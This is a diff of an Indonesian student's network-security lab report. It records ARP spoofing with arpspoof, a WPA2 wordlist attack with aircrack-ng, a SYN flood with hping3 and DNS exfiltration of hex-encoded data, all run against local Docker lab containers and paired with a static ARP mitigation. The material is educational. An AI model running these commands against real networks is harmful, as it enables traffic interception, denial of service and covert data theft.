@@ -1,13 +1,13 @@
 # Laporan UTS Network Security — Kasus 5
 
-**NIM:** 24552011357  
+**NIM:** 24552011357. Kasus 6  
 **Lingkungan:** Kali Linux (VirtualBox), Docker  
-**Workspace:** `/root/UTS-Network-Security/`
-**Perhitungan kasus:** digit NIM dijumlah → 2+4+5+5+2+0+1+1+3+5+7 = 35, lalu 35 mod 10 = 5. Jadi Kasus 5.
+**Perhitungan kasus:** digit NIM dijumlah → 2+4+5+5+2+0+1+1+3+5+7 = 35, lalu 35 mod 10 = 5. Jadi Kasus 5. <br>
+**Workspace:** `/root/UTS-Network-Security/` 
 
 ---
 
-## Tugas 1 — Docker dan Volume
+# Tugas 1 — Docker dan Volume
 
 ### Tujuan
 Menguji persistensi data menggunakan Docker Volume dan mengakses layanan Nginx dari container attacker melalui Docker Compose.
@@ -30,6 +30,8 @@ w-k5
 24552011357
 ```
 
+![Volume & Nginx](./captures/screenshots/kasus-5/tugas-01/01-volume-nginx.png)
+
 Container Compose berhasil dijalankan (`k5-attacker-1` dan `k5-target-1`). Perintah `wget` dari attacker menampilkan halaman default Nginx dengan judul **Welcome to nginx!**. Setelah pengujian, Compose dihentikan dan volume Compose dibersihkan menggunakan `down -v`.
 
 ### Kesimpulan
@@ -41,7 +43,7 @@ Data `laporan-k5.txt` tetap tersedia setelah container penulis dihapus karena da
 
 ---
 
-## Tugas 2 — Cryptography
+# Tugas 2 — Cryptography
 
 ### Tujuan
 Melakukan enkripsi dan dekripsi file menggunakan AES-256-CBC dengan PBKDF2, memeriksa integritas hasil melalui SHA-256, serta membuat sertifikat X.509.
@@ -71,6 +73,8 @@ notBefore=Nov 25 07:16:59 2026 GMT
 notAfter=Dec 25 07:16:59 2026 GMT
 ```
 
+![Enkripsi/Dekripsi & Sertifikat](./captures/screenshots/kasus-5/tugas-02/02-enkripsi-dekripsi-sertifikat.png)
+
 ### Kesimpulan
 File berhasil dienkripsi dan didekripsi. Kesamaan nilai SHA-256 menunjukkan isi file hasil dekripsi sama dengan file asli. Sertifikat self-signed RSA 2048 untuk `k5.uts.local` berhasil dibuat dengan masa berlaku 30 hari.
 
@@ -80,7 +84,7 @@ File berhasil dienkripsi dan didekripsi. Kesamaan nilai SHA-256 menunjukkan isi 
 
 ---
 
-## Tugas 3 — ARP Spoofing dan Mitigasi Static ARP
+# Tugas 3 — ARP Spoofing dan Mitigasi Static ARP
 
 ### Tujuan
 Memperagakan ARP spoofing dari container attacker terhadap container korban, kemudian mencegah perubahan pemetaan alamat MAC menggunakan static ARP.
@@ -118,6 +122,10 @@ IP Gateway: 172.19.0.3
 MAC Gateway: 1e:46:f8:f3:2f:75
 ```
 
+![Ip & Mac address](./captures/screenshots/kasus-5/tugas-03/03-ip-mac.png)
+<br>Info: di langkah selanjutnya, mac penyerang berbeda, dikarenakan instance docker yang hang, jadi mengharuskan restart service dan alamat mac sebelumnya hilang.
+
+
 ### Kendala dan penanganan
 
 1. Saat container dibuat ulang, alamat MAC gateway berubah. Karena itu, MAC gateway harus diambil ulang dari container yang sedang aktif; MAC dari percobaan sebelumnya tidak digunakan.
@@ -136,11 +144,15 @@ docker exec penyerang-k5 sh -c 'apt-get update -qq && apt-get install -y -qq dsn
 docker exec korban-k5 sh -c 'apt-get update -qq && apt-get install -y -qq iputils-ping'
 ```
 
+![Install tools](./captures/screenshots/kasus-5/tugas-03/03-install.png)
+
 ### Kondisi awal tabel ARP korban
 
 ```text
 ? (172.19.0.1) at 0a:f7:d5:38:2b:95 [ether] on eth0
 ```
+
+![Mac Sebelum](./captures/screenshots/kasus-5/tugas-03/03-mac-sebelum.png)
 
 ### Proses ARP spoofing
 
@@ -150,7 +162,7 @@ Perintah attacker:
 docker exec penyerang-k5 arpspoof -i eth0 -t 172.19.0.2 172.19.0.3
 ```
 
-Output terminal asli:
+Output terminal:
 
 ```text
 a2:1f:50:76:a8:70 ba:4a:5a:db:6e:c0 0806 42: arp reply 172.19.0.3 is-at a2:1f:50:76:a8:70
@@ -161,19 +173,23 @@ a2:1f:50:76:a8:70 ba:4a:5a:db:6e:c0 0806 42: arp reply 172.19.0.3 is-at a2:1f:50
 ^C
 ```
 
+![Arp Spoofing](./captures/screenshots/kasus-5/tugas-03/03-arp-spoofing.png)
+
 Pengecekan tabel ARP korban:
 
 ```bash
 docker exec korban-k5 arp -a
 ```
 
-Output terminal asli:
+Output terminal:
 
 ```text
 gateway-k5.lab-arp-k5 (172.19.0.3) at a2:1f:50:76:a8:70 [ether] on eth0
 ? (172.19.0.1) at 0a:f7:d5:38:2b:95 [ether] on eth0
 penyerang-k5.lab-arp-k5 (172.19.0.4) at a2:1f:50:76:a8:70 [ether] on eth0
 ```
+
+![Arp Spoofed](./captures/screenshots/kasus-5/tugas-03/03-arp-redirected.png)
 
 Hasil tersebut menunjukkan IP gateway `172.19.0.3` dipetakan ke MAC attacker `a2:1f:50:76:a8:70`.
 
@@ -186,7 +202,7 @@ docker exec korban-k5 ping -c 3 172.19.0.3
 docker exec korban-k5 arp -a
 ```
 
-Output terminal asli:
+Output terminal:
 
 ```text
 PING 172.19.0.3 (172.19.0.3) 56(84) bytes of data.
@@ -202,6 +218,8 @@ gateway-k5.lab-arp-k5 (172.19.0.3) at a2:1f:50:76:a8:70 [ether] on eth0
 penyerang-k5.lab-arp-k5 (172.19.0.4) at a2:1f:50:76:a8:70 [ether] on eth0
 ```
 
+![Arp Redirected](./captures/screenshots/kasus-5/tugas-03/03-arp-spoofed.png)
+
 ### Mitigasi menggunakan static ARP
 
 Perintah:
@@ -211,13 +229,15 @@ docker exec korban-k5 arp -s 172.19.0.3 1e:46:f8:f3:2f:75
 docker exec korban-k5 arp -a
 ```
 
-Output terminal asli:
+Output terminal:
 
 ```text
 gateway-k5.lab-arp-k5 (172.19.0.3) at 1e:46:f8:f3:2f:75 [ether] PERM on eth0
 ? (172.19.0.1) at 0a:f7:d5:38:2b:95 [ether] on eth0
 penyerang-k5.lab-arp-k5 (172.19.0.4) at a2:1f:50:76:a8:70 [ether] on eth0
 ```
+
+![Arp Mitigation](./captures/screenshots/kasus-5/tugas-03/03-arp-mitigation.png)
 
 ### Kesimpulan
 ARP spoofing berhasil ditunjukkan karena tabel ARP korban memetakan IP gateway `172.19.0.3` ke MAC attacker `a2:1f:50:76:a8:70`. Mitigasi static ARP berhasil mengembalikan pemetaan IP gateway ke MAC asli `1e:46:f8:f3:2f:75` dengan status `PERM`.
@@ -229,7 +249,7 @@ ARP spoofing berhasil ditunjukkan karena tabel ARP korban memetakan IP gateway `
 
 ---
 
-## Tugas 4 — WPA2 Handshake Analysis
+# Tugas 4 — WPA2 Handshake Analysis
 
 ### Tujuan
 Melakukan analisis file WPA2 handshake menggunakan Aircrack-ng dan wordlist untuk menguji kemungkinan menemukan password jaringan.
@@ -239,48 +259,10 @@ Melakukan analisis file WPA2 handshake menggunakan Aircrack-ng dan wordlist untu
 Perintah:
 
 ```bash
-docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k5.txt handshake-k5.cap
-```
-
-Output terminal asli:
-
-```text
-Failed to open 'handshake-k5.cap' (2): No such file or directory
-ERROR: Opening dictionary wordlist-k5.txt failed (No such file or directory)
-ERROR: Opening dictionary wordlist-k5.txt failed (No such file or directory)
-Reading packets, please wait...
-Opening handshake-k5.cap
-Read 0 packets.
-
-No networks found, exiting.
-
-Quitting aircrack-ng...
-```
-
-### 2. Pencarian file sampel
-
-Perintah:
-
-```bash
-find /root/UTS-Network-Security -type f \( -name 'handshake-k5.cap' -o -name 'wordlist-k5.txt' \)
-```
-
-Output terminal asli:
-
-```text
-/root/UTS-Network-Security/repository/UTS-Network-Security/01-sumber-lab/samples/wordlist-k5.txt
-/root/UTS-Network-Security/repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap
-```
-
-### 3. Percobaan menggunakan lokasi file yang benar
-
-Perintah:
-
-```bash
 docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w /work/repository/UTS-Network-Security/01-sumber-lab/samples/wordlist-k5.txt /work/repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap
 ```
 
-Output terminal asli:
+Output terminal:
 
 ```text
 Reading packets, please wait...
@@ -293,7 +275,9 @@ No networks found, exiting.
 Quitting aircrack-ng...
 ```
 
-### 4. Pemeriksaan format file
+![Aircrack testing](./captures/screenshots/kasus-5/tugas-04/04-testing.png)
+
+### 2. Pemeriksaan format file
 
 Perintah:
 
@@ -301,7 +285,7 @@ Perintah:
 file repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap && ls -lh repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap
 ```
 
-Output terminal asli:
+Output terminal:
 
 ```text
 repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
@@ -309,7 +293,9 @@ Permissions Links Size User Date Modified Git Name
 .rw-r--r--      1 8.2k root 25 Nov 15:46   --  repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap
 ```
 
-### 5. Pemeriksaan isi paket
+![File check](./captures/screenshots/kasus-5/tugas-04/04-checkfile.png)
+
+### 3. Pemeriksaan isi paket
 
 Perintah:
 
@@ -317,12 +303,14 @@ Perintah:
 tcpdump -nn -r repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap -c 10
 ```
 
-Output terminal asli:
+Output terminal:
 
 ```text
 reading from file repository/UTS-Network-Security/01-sumber-lab/samples/handshake-k5.cap, link-type EN10MB (Ethernet), snapshot length 65535
 tcpdump: pcap_loop: invalid packet capture length 1236031636, bigger than snaplen of 65535
 ```
+
+![Packet check](./captures/screenshots/kasus-5/tugas-04/04-checkpacket.png)
 
 ### Analisis dan kendala
 
@@ -346,41 +334,15 @@ File sampel tidak dimodifikasi atau diganti selama pengujian.
 4. Informasi format file dari perintah `file`.
 5. Error pemeriksaan capture menggunakan `tcpdump`.
 
-**Status:** Tugas 4 belum dapat diselesaikan karena kendala file capture.
-
 ---
 
 # Tugas 5 — Pengiriman ICMP dengan Scapy
 
-## Tujuan
+### Tujuan
 
 Mengirim paket ICMP Echo Request ke container korban dan mengamati nilai TTL serta tipe ICMP pada balasan.
 
-## Perintah dan hasil
-
-### 1. Percobaan pertama
-
-Perintah dijalankan dari direktori repository, tetapi file belum ditemukan pada lokasi mount yang digunakan.
-
-```text
-root@pwned-exphr:~/UTS-Network-Security# cd /root/UTS-Network-Security/repository/UTS-Network-Security
-
-docker run --rm --network lab-arp-k5 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.19.0.2
-python3: can't open file '/work/kirim_icmp.py': [Errno 2] No such file or directory
-
-root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
-```
-
-### 2. Mencari lokasi file
-
-```text
-root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# find /root/UTS-Network-Security/repository/UTS-Network-Security -type f -name 'kirim_icmp.py'
-/root/UTS-Network-Security/repository/UTS-Network-Security/01-sumber-lab/kasus/k5-scapy/kirim_icmp.py
-
-root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
-```
-
-### 3. Menjalankan perintah dengan lokasi file yang benar
+### Perintah
 
 ```text
 root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# docker run --rm --network lab-arp-k5 -v "$PWD/01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.19.0.2
@@ -391,51 +353,30 @@ Tipe ICMP balasan: 0
 root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
 ```
 
-## Analisis
+![ICMP Testing](./captures/screenshots/kasus-5/tugas-05/05-icmp.png)
+
+### Kesimpulan
 
 - Paket ICMP Echo Request dikirim dari `172.19.0.5` menuju korban `172.19.0.2`.
 - **TTL balasan: 64** — nilai Time To Live pada paket balasan yang diterima.
 - **Tipe ICMP balasan: 0** — ICMP Type 0 adalah Echo Reply. Artinya, target membalas permintaan ICMP.
 
-## Penjelasan Smurf Attack
-
 Smurf Attack merupakan serangan DoS yang menyalahgunakan ICMP Echo Request. Penyerang mengirim Echo Request ke alamat broadcast dengan alamat IP korban dipalsukan sebagai alamat sumber. Host-host yang menerima permintaan tersebut dapat mengirimkan Echo Reply kepada korban secara bersamaan sehingga korban menerima lonjakan trafik.
 
-## Bukti
-
+### Bukti
 Screenshot terminal yang menampilkan hasil pengiriman ICMP, TTL balasan `64`, dan tipe ICMP balasan `0` digunakan sebagai bukti Tugas 5.
-
-## Status
-
-**Berhasil.** Target membalas ICMP Echo Request dengan TTL `64` dan ICMP Type `0` (Echo Reply).
 
 ---
 
-### Tugas 6 — SYN Flood
+# Tugas 6 — SYN Flood
 
-## Tujuan
+### Tujuan
 
 Menjalankan simulasi SYN Flood menggunakan `hping3`, mengamati jumlah koneksi berstatus `SYN_RECV`, dan menangkap paket TCP menggunakan `tcpdump`.
 
-## Langkah dan Hasil
+### Perintah
 
 ### 1. Menjalankan Container
-
-Percobaan pertama menggunakan path yang belum benar:
-
-```text
-root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml up -d
-open /root/UTS-Network-Security/repository/UTS-Network-Security/b/b3-syn-flood/docker-compose.yml: no such file or directory
-```
-
-Mencari lokasi file Compose:
-
-```text
-root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# find . -type f -path '*b3-syn-flood*' -name 'docker-compose.yml'
-./01-sumber-lab/b/b3-syn-flood/docker-compose.yml
-
-root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
-```
 
 Menjalankan Compose dengan path yang benar:
 
@@ -449,18 +390,18 @@ root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# docker 
 root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
 ```
 
-SS 1 — Container attacker dan target berhasil dijalankan.
+![Container](./captures/screenshots/kasus-5/tugas-06/06-container.png)
 
 ### 2. Memeriksa SYN_RECV Sebelum Serangan
 
 ```text
-root@pwned-exphr:~/UTS-Network-Security/documents# docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
+root@pwned-exphr:~/UTS-Network-Security/documents# docker compose -p k5 -f /root/UTS-Network-Security/repository/UTS-Network-Security/01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
 0
 
 root@pwned-exphr:~/UTS-Network-Security/documents#
 ```
 
-SS 2 — Jumlah koneksi SYN_RECV sebelum serangan adalah 0.
+![SYN_RECV](./captures/screenshots/kasus-5/tugas-06/06-syn_recv.png)
 
 ### 3. Menjalankan SYN Flood
 
@@ -472,7 +413,7 @@ root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# docker 
 root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
 ```
 
-SS 3 — Perintah SYN Flood berhasil dijalankan. Tidak ada output karena proses berjalan di background.
+![SYN Flood](./captures/screenshots/kasus-5/tugas-06/06-syn_flood.png)
 
 ### 4. Memeriksa SYN_RECV Setelah Serangan
 
@@ -483,37 +424,9 @@ root@pwned-exphr:~/UTS-Network-Security/documents# docker compose -p k5 -f /root
 root@pwned-exphr:~/UTS-Network-Security/documents#
 ```
 
-SS 4 — Jumlah koneksi SYN_RECV setelah serangan tetap 0.
+![SYN_RECV](./captures/screenshots/kasus-5/tugas-06/06-syn_recv.png)
 
 ### 5. Mengamati Paket TCP Menggunakan tcpdump
-
-Percobaan pertama:
-
-```text
-root@pwned-exphr:~/UTS-Network-Security/documents# docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
-tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
-listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
-08:00:10.186308 IP 172.20.0.2.41532 > 172.20.0.3.80: Flags [S], seq 3793161137, win 64240, options [mss 1460,sackOK,TS val 3698234988 ecr 0,nop,wscale 10], length 0
-08:00:10.186329 IP 172.20.0.3.80 > 172.20.0.2.41532: Flags [S.], seq 794999286, ack 3793161138, win 65160, options [mss 1460,sackOK,TS val 1897505331 ecr 3698234988,nop,wscale 10], length 0
-08:00:10.186338 IP 172.20.0.2.41532 > 172.20.0.3.80: Flags [.], ack 1, win 63, options [nop,nop,TS val 3698234988 ecr 1897505331], length 0
-08:00:10.186434 IP 172.20.0.2.41532 > 172.20.0.3.80: Flags [P.], seq 1:71, ack 1, win 63, options [nop,nop,TS val 3698234988 ecr 1897505331], length 70: HTTP: GET / HTTP/1.1
-08:00:10.186445 IP 172.20.0.3.80 > 172.20.0.2.41532: Flags [.], ack 71, win 64, options [nop,nop,TS val 1897505331 ecr 3698234988], length 0
-08:00:10.186678 IP 172.20.0.3.80 > 172.20.0.2.41532: Flags [P.], seq 1:240, ack 71, win 64, options [nop,nop,TS val 1897505331 ecr 3698234988], length 239: HTTP: HTTP/1.1 200 OK
-08:00:10.186735 IP 172.20.0.2.41532 > 172.20.0.3.80: Flags [.], ack 240, win 63, options [nop,nop,TS val 3698234988 ecr 1897505331], length 0
-08:00:10.186787 IP 172.20.0.3.80 > 172.20.0.2.41532: Flags [P.], seq 240:1136, ack 71, win 64, options [nop,nop,TS val 1897505331 ecr 3698234988], length 896: HTTP
-08:00:10.186792 IP 172.20.0.2.41532 > 172.20.0.3.80: Flags [.], ack 1136, win 63, options [nop,nop,TS val 3698234988 ecr 1897505331], length 0
-08:00:10.186844 IP 172.20.0.2.41532 > 172.20.0.3.80: Flags [F.], seq 71, ack 1136, win 63, options [nop,nop,TS val 3698234988 ecr 1897505331], length 0
-08:00:10.186887 IP 172.20.0.3.80 > 172.20.0.2.41532: Flags [F.], seq 1136, ack 72, win 64, options [nop,nop,TS val 1897505331 ecr 3698234988], length 0
-08:00:10.186893 IP 172.20.0.2.41532 > 172.20.0.3.80: Flags [.], ack 1137, win 63, options [nop,nop,TS val 3698234988 ecr 1897505331], length 0
-
-12 packets captured
-12 packets received by filter
-0 packets dropped by kernel
-
-root@pwned-exphr:~/UTS-Network-Security/documents#
-```
-
-Percobaan kedua:
 
 ```text
 root@pwned-exphr:~/UTS-Network-Security/documents# docker compose -p k5 -f /root/UTS-Network-Security/repository/UTS-Network-Security/01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
@@ -539,7 +452,7 @@ listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 root@pwned-exphr:~/UTS-Network-Security/documents#
 ```
 
-SS 5 — Simpan screenshot output tcpdump. Terlihat paket SYN, SYN-ACK, ACK, dan respons HTTP 200 OK.
+![TCPDUMP](./captures/screenshots/kasus-5/tugas-06/06-tcpdump.png)
 
 ### 6. Membersihkan Container
 
@@ -553,37 +466,27 @@ root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# docker 
 root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
 ```
 
-SS 6 — Container attacker, target, dan network berhasil dihapus.
+![Clear container](./captures/screenshots/kasus-5/tugas-06/06-clearing-container.png)
 
-## Analisis
+### Kesimpulan
 
 - Perintah `hping3 -S -p 80 --flood target` digunakan untuk mengirim paket TCP SYN ke port 80 secara terus-menerus selama 15 detik.
 - Pemeriksaan `SYN_RECV` sebelum dan setelah serangan sama-sama menghasilkan `0`. Artinya, hasil pemeriksaan tidak menunjukkan peningkatan koneksi setengah terbuka.
 - `tcpdump` menangkap 12 paket. Terlihat urutan SYN (`[S]`), SYN-ACK (`[S.]`), dan ACK (`[.]`), yang merupakan proses three-way handshake TCP.
 - Target memberikan respons `HTTP/1.1 200 OK`, yang menunjukkan permintaan HTTP berhasil dilayani.
 
-## Kesimpulan
-
 Simulasi perintah SYN Flood berhasil dijalankan dan lalu lintas TCP berhasil diamati menggunakan tcpdump. Namun, nilai `SYN_RECV` tetap `0`, sehingga bukti yang diperoleh tidak menunjukkan peningkatan koneksi half-open. Output tcpdump memperlihatkan koneksi TCP normal yang berhasil terbentuk dan respons HTTP `200 OK`.
-
-## Daftar Screenshot
-
-1. SS 1 — Container attacker dan target berhasil dijalankan.
-2. SS 2 — Jumlah SYN_RECV sebelum serangan (`0`).
-3. SS 3 — Perintah SYN Flood dijalankan.
-4. SS 4 — Jumlah SYN_RECV setelah serangan (`0`).
-5. SS 5 — Output tcpdump yang menampilkan paket TCP.
-6. SS 6 — Cleanup container dan network berhasil.
 
 ---
 
 # TUGAS 7 — DNS EXFILTRATION
 
-## 1. Tujuan
+### Tujuan
 
 Melakukan simulasi DNS Exfiltration dengan mengirimkan data NIM melalui DNS query menggunakan encoding hexadecimal, kemudian menganalisis log DNS dan mengembalikan data ke bentuk semula.
 
-## 2. Menjalankan Container DNS Exfiltration
+### Perintah
+### 1. Menjalankan Container DNS Exfiltration
 
 Perintah:
 
@@ -603,13 +506,9 @@ root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# docker 
 root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
 ```
 
-Analisis:
+![Run Container](./captures/screenshots/kasus-5/tugas-07/07-run-container.png)
 
-Container attacker dan DNS berhasil dijalankan. Network `k5_lab` juga berhasil dibuat.
-
-**Screenshot 1:** Bukti container berhasil dijalankan.
-
-## 3. Encoding NIM ke Hexadecimal
+### 2. Encoding NIM ke Hexadecimal
 
 Perintah:
 
@@ -626,7 +525,7 @@ root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security# echo -n
 root@pwned-exphr:~/UTS-Network-Security/repository/UTS-Network-Security#
 ```
 
-Analisis:
+<br>
 
 NIM `24552011357` berhasil dikonversi menjadi hexadecimal:
 
@@ -634,9 +533,9 @@ NIM `24552011357` berhasil dikonversi menjadi hexadecimal:
 
 Encoding ini digunakan untuk merepresentasikan data NIM sebagai bagian dari nama domain DNS.
 
-**Screenshot 2:** Bukti hasil encoding hexadecimal.
+![Hex encode](./captures/screenshots/kasus-5/tugas-07/07-hex-convert.png)
 
-## 4. Mengirim DNS Query
+### 3. Mengirim DNS Query
 
 Perintah:
 
@@ -657,9 +556,9 @@ Analisis:
 
 DNS query berhasil dikirim ke server DNS dengan nama domain yang memuat data hexadecimal NIM. Server DNS memberikan respons `10.0.0.99`.
 
-**Screenshot 3:** Bukti DNS query dan respons server.
+![Exfiltrate](./captures/screenshots/kasus-5/tugas-07/07-dns-exfil.png)
 
-## 5. Mengambil dan Menganalisis DNS Log
+### 4. Mengambil dan Menganalisis DNS Log
 
 Perintah untuk menyimpan log:
 
@@ -699,9 +598,9 @@ Hasil analisis menunjukkan terdapat satu query ke domain induk `exfil.lab`.
 
 Bagian `Query mencurigakan (label panjang berisi hex)` tidak menampilkan entri. Artinya, script tidak melaporkan label mencurigakan secara eksplisit pada hasil tersebut. Meskipun demikian, query DNS yang memuat data hexadecimal berhasil dikirim pada langkah sebelumnya.
 
-**Screenshot 4:** Bukti hasil analisis DNS log.
+![Analisis Log](./captures/screenshots/kasus-5/tugas-07/07-dns-log.png)
 
-## 6. Decoding Hexadecimal
+### 5. Decoding Hexadecimal
 
 Perintah:
 
@@ -721,9 +620,9 @@ Analisis:
 
 Data hexadecimal berhasil dikembalikan menjadi teks asli, yaitu NIM `24552011357`. Hasilnya sesuai dengan data NIM sebelum proses encoding.
 
-**Screenshot 5:** Bukti hasil decoding NIM.
+![Decode Hex](./captures/screenshots/kasus-5/tugas-07/07-hex-decode.png)
 
-## 7. Cleanup
+### 6. Cleanup
 
 Perintah:
 
@@ -747,9 +646,9 @@ Analisis:
 
 Seluruh container dan network yang digunakan dalam simulasi berhasil dihapus.
 
-**Screenshot 6:** Bukti cleanup container dan network.
+![Cleanup](./captures/screenshots/kasus-5/tugas-07/07-cleanup.png)
 
-## 8. Kesimpulan
+### Kesimpulan
 
 Simulasi DNS Exfiltration berhasil dilakukan dengan mengirimkan NIM melalui DNS query dalam bentuk hexadecimal.
 
@@ -762,15 +661,3 @@ Hasil pengujian menunjukkan:
 5. Data hexadecimal berhasil didecode kembali menjadi NIM asli.
 
 DNS Exfiltration merupakan teknik penyelundupan data melalui protokol DNS. Data dapat disisipkan pada subdomain dalam DNS query sehingga lalu lintas DNS yang terlihat normal dapat digunakan untuk membawa informasi keluar dari suatu jaringan.
-
-## 9. Checklist Screenshot
-
-- [x] Screenshot 1 — Container DNS dan attacker berhasil dijalankan.
-- [x] Screenshot 2 — Encoding NIM ke hexadecimal.
-- [x] Screenshot 3 — DNS query dan respons server.
-- [x] Screenshot 4 — Hasil analisis DNS log.
-- [x] Screenshot 5 — Decoding hexadecimal menjadi NIM.
-- [x] Screenshot 6 — Cleanup container dan network.
-
-**Status: Tugas 7 selesai.**
-```
